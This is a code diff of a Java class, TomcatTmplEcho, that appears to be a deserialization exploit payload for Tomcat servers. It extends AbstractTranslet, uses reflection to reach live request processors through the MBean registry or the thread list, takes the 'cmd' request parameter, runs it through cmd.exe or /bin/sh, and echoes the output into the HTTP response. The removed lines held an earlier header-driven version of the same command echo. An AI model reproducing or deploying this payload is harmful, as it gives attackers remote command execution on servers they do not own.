@@ -5,18 +5,45 @@ import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.coyote.Request;
+import org.apache.coyote.Response;
+
 import java.lang.reflect.Field;
-import java.util.List;
-import java.util.Scanner;
+import java.util.ArrayList;
+import java.util.HashMap;
 
 public class TomcatTmplEcho extends AbstractTranslet {
+    public Object getMBeanDomainTb() throws Exception {
+        javax.management.MBeanServer mBeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
+        Object mbsInterceptor = getFV(mBeanServer, "mbsInterceptor");
+        Object repository = getFV(mbsInterceptor, "repository");
+        Object domainTb = getFV(repository, "domainTb");
+        return domainTb;
+    }
 
-    public TomcatTmplEcho(){
-        try{
+    public Object getMBeanProcessors() throws Exception {
+        HashMap domainTb = (HashMap) getMBeanDomainTb();
+        HashMap hashMap = (HashMap) (domainTb.get("Tomcat") != null ? domainTb.get("Tomcat") : domainTb.get("Catalina"));//内嵌为Tomcat
+        java.util.Iterator it1 = hashMap.keySet().iterator();
+        while (it1.hasNext()) {
+            String key = (String) it1.next();
+            if (key.indexOf("name=") != -1 && key.indexOf("type=GlobalRequestProcessor") != -1) {
+                Object obj = hashMap.get(key);
+                Object object = getFV(obj, "object");
+                Object resource = getFV(object, "resource");
+                Object processors = getFV(resource, "processors");
+                return processors;
+            }
+        }
+        return null;
+    }
+
+    public Object getThreadProcessors() throws Exception {
+        try {
             boolean var4 = false;
-            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
+            Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
 
-            for(int var6 = 0; var6 < var5.length; ++var6) {
+            for (int var6 = 0; var6 < var5.length; ++var6) {
                 Thread var7 = var5[var6];
                 if (var7 != null) {
                     String var3 = var7.getName();
@@ -29,45 +56,31 @@ public class TomcatTmplEcho extends AbstractTranslet {
                                 continue;
                             }
 
-                            List var9 = (List)getFV(var1, "processors");
-
-                            for(int var10 = 0; var10 < var9.size(); ++var10) {
-                                Object var11 = var9.get(var10);
-                                var1 = getFV(var11, "req");
-                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
-                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "Testecho");
-                                if (var3 != null && !var3.isEmpty()) {
-                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
-                                    var2.getClass().getMethod("addHeader", String.class, String.class).invoke(var2, "Testecho", var3);
-                                    var4 = true;
-                                }
-
-                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "cmd");
-                                if (var3 != null && !var3.isEmpty()) {
-                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
-                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var3} : new String[]{"/bin/sh", "-c", var3};
-                                    writeBody(var2, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
-                                    var4 = true;
-                                }
-
-                                if ((var3 == null || var3.isEmpty()) && var4) {
-                                    writeBody(var2, System.getProperties().toString().getBytes());
-                                }
-
-                                if (var4) {
-                                    break;
-                                }
-                            }
-
-                            if (var4) {
-                                break;
-                            }
+                            Object var9 = getFV(var1, "processors");
+                            return var9;
                         }
                     }
                 }
             }
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
+        }
+        return null;
+    }
+
+    public TomcatTmplEcho() throws Exception {
+        ArrayList processors = (ArrayList) getMBeanProcessors();
+        processors = processors != null ? processors : (ArrayList) getThreadProcessors();
+        for (int i = 0; i < processors.size(); ++i) {
+            Request request = (Request) getFV(processors.get(i),"req");
+            String var3 = request.getParameters().getParameter("cmd");
+            System.out.println(var3);
+            if (var3 != null && !var3.isEmpty()) {
+                Response response = request.getResponse();
+                String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var3} : new String[]{"/bin/sh", "-c", var3};
+                writeBody(response, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
+                break;
+            }
         }
     }
 
@@ -84,14 +97,12 @@ public class TomcatTmplEcho extends AbstractTranslet {
             var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
             var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
         }
-
     }
 
     private static Object getFV(Object var0, String var1) throws Exception {
         Field var2 = null;
         Class var3 = var0.getClass();
-
-        while(var3 != Object.class) {
+        while (var3 != Object.class) {
             try {
                 var2 = var3.getDeclaredField(var1);
                 break;
@@ -99,7 +110,6 @@ public class TomcatTmplEcho extends AbstractTranslet {
                 var3 = var3.getSuperclass();
             }
         }
-
         if (var2 == null) {
             throw new NoSuchFieldException(var1);
         } else {
